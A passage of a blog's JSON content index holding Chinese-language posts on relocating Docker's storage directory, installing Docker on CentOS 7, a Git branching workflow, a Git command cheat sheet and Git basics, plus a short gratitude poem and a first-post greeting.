测试是否生效","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"Docker修改默认存储位置","slug":"Docker修改默认存储位置","date":"2017-03-02T07:10:23.000Z","updated":"2017-03-29T00:41:49.000Z","comments":true,"path":"2017/03/02/Docker修改默认存储位置/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker修改默认存储位置/","excerpt":"","text":"停止docker 1systemctl stop docker 备份默认docker存储数据 1mv /var/lib/docker&#123;,.bak&#125; 创建docker数据存放文件夹 1mkdir /data/docker 创建软连接 1ln -s /data/docker/ /var/lib/docker 启动docker 1systemctl start docker 查看存储位置","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"How to Install Docker Engine on CentOS 7.","slug":"How-to-install-docker-engine-on-CentOS-7","date":"2017-02-28T05:32:27.000Z","updated":"2017-03-06T06:54:18.000Z","comments":true,"path":"2017/02/28/How-to-install-docker-engine-on-CentOS-7/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/How-to-install-docker-engine-on-CentOS-7/","excerpt":"","text":"1.Remove default docker package.12yum -y remove docker docker-common container-selinuxyum -y remove docker-selinux 2.Install Docker engine123456yum install -y yum-utilsyum-config-manager --add-repo https://docs.docker.com/engine/installation/linux/repo_files/centos/docker.repoyum-config-manager --enable docker-testingyum-config-manager --disable docker-testingyum makecache fastyum -y install docker-engine","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"}]},{"title":"Git利用分支进行开发的工作流程","slug":"Git利用分支进行开发的工作流程","date":"2017-02-28T05:24:47.000Z","updated":"2017-05-02T09:25:42.000Z","comments":true,"path":"2017/02/28/Git利用分支进行开发的工作流程/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/Git利用分支进行开发的工作流程/","excerpt":"","text":"[toc] Git 利用分支进行开发的工作流程Git 作为一个源码管理系统，不可避免涉及到多人协作。协作必须有一个规范的工作流程，让大家有效地合作，使得项目井井有条地发展下去。”工作流程”在英语里，叫做”workflow”或者”flow”，原意是水流，比喻项目像水流那样，顺畅、自然地向前流动，不会发生冲击、对撞、甚至漩涡。 一、长期分支master 分支master 永远处于稳定状态，这个分支代码可以随时用来部署。不允许在该分支直接提交代码。 develop 分支开发分支，包含了项目最新的功能和代码，所有开发都在 develop 上进行。一般情况下小的修改直接在这个分支上提交代码。 二、短期分支feature 分支如果要改的一个东西会有比较多的修改，或者改的东西影响会比较大，请从 develop 分支开出一个 feature 分支，分支名约定为feature/xxx，开发完成后合并回 develop 分支并且删除这个 feature 分支，相应的操作如下： 1234567$ git checkout -b feature/xxx develop# 写代码，提交，写代码，提交。。。# feature 开发完成，合并回 develop$ git checkout develop# 务必加上 --no-ff，以保持分支的合并历史$ git merge --no-ff feature/xxx$ git branch -d feature/xxx 如果想要当前分支能保持与 develop 的更新，请用 rebase，操作如下： 12# 假设当前在 feature/xxx 分支$ git rebase develop rebase 会修改历史，如果你的 feature 分支是跟人合作开发的，请互相做好协调。 release 分支当 develop 上的功能和 bug 修得差不多的时候，我们就要发布新版本了，这个时候从 develop 分支上开出一个 release 分支，来做发布前的准备，分支名约定为release/20121221，主要是测试有没有什么 bug，如果有 bug 就直接在这个分支上修复，确定没有问题后就会合并到 master 分支。相应操作如下： 1234$ git checkout -b release/20121221 develop# 修复 bug、检查没问题后合并到 master 分支并删除$ git checkout master$ git merge --no-ff release/20121221 为了让 release 分支上 bug 修改作用到 develop 分支，我们还需要把这个 release 分支合并回 develop 分支： 1234$ git checkout develop$ git merge --no-ff release/20121221# 到此，这个 release 分支完成了它的使命，可以被删除了$ git branch -d release/20121221 hotfix 分支如果我们发现线上的代码（也就是 master）有 bug，但是这个时候我们的 develop 上的有些功能还没完成，还不能发布，这个时候我们可以从 master 分支上开出一个 hotfix 分支（记住：直接在 master 上提交代码是不允许的！），分支名约定为hotfix/xxx，在这个分支上修改完 bug 后需要把这个分支同时合并到 master 和 develop 分支。相应操作如下： 12345678$ git checkout -b hotfix/xxx master# 修完 bug 后$ git checkout master$ git merge --no-ff hotfix/xxx$ git checkout develop$ git merge --no-ff hotfix/xxx# hotfix 分支完成使命$ git branch -d hotfix/xxx 例外：当 hotfix 分支完成，这个时候如果有 release 分支存在，那么这个 hotfix 就应该合并到 release，而不是 develop 分支。 三、proj 分支proj 分支为项目分支，所有的项目分支都从 master 上开出来，约定的分支名为proj/xxx。所有的项目定制内容都直接在项目分支上提交。为了保证项目的更新，每当项目有新版本发布时都需要把 master 分支合并到 proj 分支上。相应操作如下： 12345$ git checkout -b proj/xxx master# 定制。。。# 如果 master 分支有更新$ git checkout proj/xxx master$ git merge --no-ff master","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"git","slug":"技术文档/Tools/git","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"}]},{"title":"Git常用命令","slug":"Git常用命令","date":"2017-02-28T03:24:49.000Z","updated":"2017-05-02T09:24:59.000Z","comments":true,"path":"2017/02/28/Git常用命令/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/Git常用命令/","excerpt":"","text":"[toc] Git常用命令Git 命令行操作工作流程 Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 一、新建代码库 在当前目录新建一个Git代码库 1git init 新建一个目录，将其初始化为Git代码库 1git init [project-name] 下载一个项目和它的整个代码历史 1git clone [url] 二、配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 显示当前的Git配置 1git config --list 编辑Git配置文件 1git config -e [--global] 设置提交代码时的用户信息 12git config [--global] user.name &quot;[name]&quot;git config [--global] user.email &quot;[email address]&quot; 三、增加/删除文件 添加指定文件到暂存区 1git add [file1] [file2] ... 添加指定目录到暂存区，包括子目录 1git add [dir] 添加当前目录的所有文件到暂存区 1git add . 添加每个变化前，都会要求确认,对于同一个文件的多处变化，可以实现分次提交 1git add -p 删除工作区文件，并且将这次删除放入暂存区 1git rm [file1] [file2] ... 停止追踪指定文件，但该文件会保留在工作区 1git rm --cached [file] 改名文件，并且将这个改名放入暂存区 1git mv [file-original] [file-renamed] 四、代码提交 提交暂存区到仓库区 1git commit -m [message] 提交暂存区的指定文件到仓库区 1git commit [file1] [file2] ... -m [message] 提交工作区自上次commit之后的变化，直接到仓库区 1git commit -a 提交时显示所有diff信息 1git commit -v 使用一次新的commit，替代上一次提交, 如果代码没有任何新变化，则用来改写上一次commit的提交信息 1git commit --amend -m [message] 重做上一次commit，并包括指定文件的新变化 1git commit --amend [file1] [file2] ... 五、分支 列出所有本地分支 1git branch 列出所有远程分支 1git branch -r 列出所有本地分支和远程分支 1git branch -a 新建一个分支，但依然停留在当前分支 1git branch [branch-name] 新建一个分支，并切换到该分支 1git checkout -b [branch] 新建一个分支，指向指定commit 1git branch [branch] [commit] 新建一个分支，与指定的远程分支建立追踪关系 1git branch --track [branch] [remote-branch] 切换到指定分支，并更新工作区 1git checkout [branch-name] 切换到上一个分支 1git checkout - 建立追踪关系，在现有分支与指定的远程分支之间 1git branch --set-upstream [branch] [remote-branch] 合并指定分支到当前分支 1git merge [branch] 选择一个commit，合并进当前分支 1git cherry-pick [commit] 删除分支 1git branch -d [branch-name] 删除远程分支 12git push origin --delete [branch-name]git branch -dr [remote/branch] 六、标签 列出所有tag 1git tag 新建一个tag在当前commit 1git tag [tag] 新建一个tag在指定commit 1git tag [tag] [commit] 删除本地tag 1git tag -d [tag] 删除远程tag 1git push origin :refs/tags/[tagName] 查看tag信息 1git show [tag] 提交指定tag 1git push [remote] [tag] 提交所有tag 1git push [remote] --tags 新建一个分支，指向某个tag 1git checkout -b [branch] [tag] 七、查看信息 显示有变更的文件 1git status 显示当前分支的版本历史 1git log 显示commit历史，以及每次commit发生变更的文件 1git log --stat 搜索提交历史，根据关键词 1git log -S [keyword] 显示某个commit之后的所有变动，每个commit占据一行 1git log [tag] HEAD --pretty=format:%s 显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件 1git log [tag] HEAD --grep feature 显示某个文件的版本历史，包括文件改名 12git log --follow [file]git whatchanged [file] 显示指定文件相关的每一次diff 1git log -p [file] 显示过去5次提交 1git log -5 --pretty --oneline 显示所有提交过的用户，按提交次数排序 1git shortlog -sn 显示指定文件是什么人在什么时间修改过 1git blame [file] 显示暂存区和工作区的差异 1git diff 显示暂存区和上一个commit的差异 1git diff --cached [file] 显示工作区与当前分支最新commit之间的差异 1git diff HEAD 显示两次提交之间的差异 1git diff [first-branch]...[second-branch] 显示今天你写了多少行代码 1git diff --shortstat &quot;@&#123;0 day ago&#125;&quot; 显示某次提交的元数据和内容变化 1git show [commit] 显示某次提交发生变化的文件 1git show --name-only [commit] 显示某次提交时，某个文件的内容 1git show [commit]:[filename] 显示当前分支的最近几次提交 1git reflog 八、远程同步 下载远程仓库的所有变动 1git fetch [remote] 显示所有远程仓库 1git remote -v 显示某个远程仓库的信息 1git remote show [remote] 增加一个新的远程仓库，并命名 1git remote add [shortname] [url] 取回远程仓库的变化，并与本地分支合并 1git pull [remote] [branch] 上传本地指定分支到远程仓库 1git push [remote] [branch] 强行推送当前分支到远程仓库，即使有冲突 1git push [remote] --force 推送所有分支到远程仓库 1git push [remote] --all 九、撤销 恢复暂存区的指定文件到工作区 1git checkout [file] 恢复某个commit的指定文件到暂存区和工作区 1git checkout [commit] [file] 恢复暂存区的所有文件到工作区 1git checkout . 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 1git reset [file] 重置暂存区与工作区，与上一次commit保持一致 1git reset --hard 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 1git reset [commit] 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 1git reset --hard [commit] 重置当前HEAD为指定commit，但保持暂存区和工作区不变 1git reset --keep [commit] 新建一个commit，用来撤销指定commit 后者的所有变化都将被前者抵消，并且应用到当前分支 1git revert [commit] 暂时将未提交的变化移除，稍后再移入 12git stashgit stash pop 十、其他 生成一个可供发布的压缩包1git archive","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"git","slug":"技术文档/Tools/git","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"},{"name":"git command","slug":"git-command","permalink":"http://blog.unixmen.cn/tags/git-command/"},{"name":"git 命令行","slug":"git-命令行","permalink":"http://blog.unixmen.cn/tags/git-命令行/"}]},{"title":"Git 基础操作","slug":"Git-基础操作","date":"2017-02-17T16:59:59.000Z","updated":"2017-05-02T09:25:20.000Z","comments":true,"path":"2017/02/18/Git-基础操作/","link":"","permalink":"http://blog.unixmen.cn/2017/02/18/Git-基础操作/","excerpt":"","text":"Git 是什么 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。 Git 与 SVN 区别GIT不仅仅是个版本控制系统，它也是个内容管理系统(CMS),工作管理系统等。如果你是一个具有使用SVN背景的人，你需要做一定的思想转换，来适应GIT提供的一些概念和特征。 区别： GIT是分布式的，SVN不是：这是GIT和其它非分布式的版本控制系统，例如SVN，CVS等，最核心的区别。 GIT把内容按元数据方式存储，而SVN是按文件：所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。 GIT分支和SVN的分支不同：分支在SVN中一点不特别，就是版本库中的另外的一个目录。 GIT没有一个全局的版本号，而SVN有：目前为止这是跟SVN相比GIT缺少的最大的一个特征。 GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。 快速入门：如何安装：Windows Git 安装包下载 Mac Git 安装包下载 Linux 安装教程 创建新仓库创建新的 git 仓库： 创建新文件夹 进入新文件夹 命令行执行”git init” 实例： 以上操作将创建一个名为 .git 的子目录，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。点击链接获取更多关于.git文件夹中包含了文件的信息。 如果你是在一个非空文件夹中初始化，需要： 添加跟踪（git add） 提交（git commit） 实例： 获取Git仓库执行如下命令以创建一个本地仓库的克隆版本：1git clone https://github.com/netb2c/netb2c.github.io.git 如果是远端服务器上的仓库,可使用SSH传输协议:1git clone git@10.160.0.200:/data/sdk_svnserver/netb2c.git 检查当前文件状态要查看哪些文件处于什么状态，可以用 git status 命令1git status 以上反馈信息显示： 当前所在工作目录相当干净 所有已跟踪文件在上次提交后都未被更改过 当前目录下没有出现任何处于未跟踪状态的新文件 显示了当前所在分支(“master”) 添加、修改文件测试： 以上打印信息可以看到： daily_task.md 文件在Changes not staged for commit下面：– 文件内容发生便会– 未在暂存区需要保存到暂存区，需要执行”git add” 暂存修改 新建的 README.md 文件现在 Untracked files 下面：– 新文件未被跟踪– 新闻界需要添加跟踪 跟踪新文件使用命令 git add 开始跟踪一个文件：1git add 正常情况下不会打印信息。 再次查看状态： 两个文档都在Changes to be committed下:– 此时已暂时保存当前文档状态注：git add 只是将增加、修改后文件添加内容到下一次提交中”而不是“将文件直接添加到项目中” 简略状态信息查看git status 命令的输出十分详细，但其用语有些繁琐。如果你使用 git status -s 命令或 git status –short 命令，你将得到一种更为紧凑的格式输出，如图： A：新增 M：修改 ??：未被跟踪 查看已暂存和未暂存的修改git status 命令的输出对于你来说过于模糊，你想知道具体修改了什么地方，可以用 git diff 命令。 要查看尚未暂存的文件更新了哪些部分，不加参数直接输入 git diff 若要查看已暂存的将要添加到下次提交里的内容，需用 git diff –staged 提交更新暂存区域已经准备妥当可以提交了。一定要确认还有什么修改过的或新建的文件还没有 git add 过，否则提交的时候不会记录这些还没暂存起来的变化。 这些修改过的文件只保留在本地磁盘。 所以，每次准备提交前，先用 git status 看下，是不是都已暂存起来了， 然后再运行提交命令 git commit： 跳过使用暂存区域 Git 提供了一个跳过使用暂存区域的方式， 只要在提交的时候，给 git commit 加上 -a 选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 git add 步骤，详见下图： 删除文件要从 Git 中移除某个文件，就必须要从已跟踪文件清单中移除（确切地说，是从暂存区域移除），然后提交。 可以用 git rm 命令完成此项工作，并连带从工作目录中删除指定的文件，这样以后就不会出现在未跟踪文件清单中了。 正确的删除版本控制库文件需要： 删除本地文件： rm file 从版本控制库中删除： git rm file 提交更新： git commit -m “Commit message.” 移动文件Git 并不显式跟踪文件移动操作。 如果在 Git 中重命名了某个文件，仓库中存储的元数据并不会体现出这是一次改名操作。需要使用命令：1git mv old_name new_name 实例： 其实，运行 git mv 就相当于运行了下面三条命令：123mv README.md READMEgit rm README.mdgit add README","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"git","slug":"技术文档/Tools/git","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"}]},{"title":"感恩","slug":"感恩","date":"2017-02-17T03:06:56.000Z","updated":"2017-02-17T06:09:43.000Z","comments":true,"path":"2017/02/17/感恩/","link":"","permalink":"http://blog.unixmen.cn/2017/02/17/感恩/","excerpt":"","text":"感恩123456789101112131415161718[感恩]是快乐的来源，感恩天地，生命之源感恩阳光，托起梦想感恩万物，助我成长感恩父母，赐予生命感恩兄弟，手足情深感恩某人，冤家聚首感恩孩子，舐犊情深感恩恩师，淳淳教诲感恩朋友，知心之谊感恩同袍，携手同行感恩领导，不吝提携感恩公司，给我平台感恩挫折，让我成长感恩命运，让我懂得感恩黑暗，让我领悟感恩科技，建立博客感恩，感恩，感恩....","raw":null,"content":null,"categories":[{"name":"生活","slug":"Life","permalink":"http://blog.unixmen.cn/categories/Life/"}],"tags":[{"name":"感恩","slug":"感恩","permalink":"http://blog.unixmen.cn/tags/感恩/"}]},{"title":"第一篇博客","slug":"first","date":"2017-02-17T03:03:39.000Z","updated":"2017-02-17T06:10:44.000Z","comments":true,"path":"2017/02/17/first/","link":"","permalink":"http://blog.unixmen.cn/2017/02/17/first/","excerpt":"","text":"就这么开始吧，精彩内容敬请期待…","raw":null,"content":null,"categories":[{"name":"生活","slug":"Life","permalink":"http://blog.unixmen.cn/categories/Life/"}],"tags":[{"name":"开篇","slug":"开篇","permalink":"http://blog.unixmen.cn/tags/开篇/"}]}]}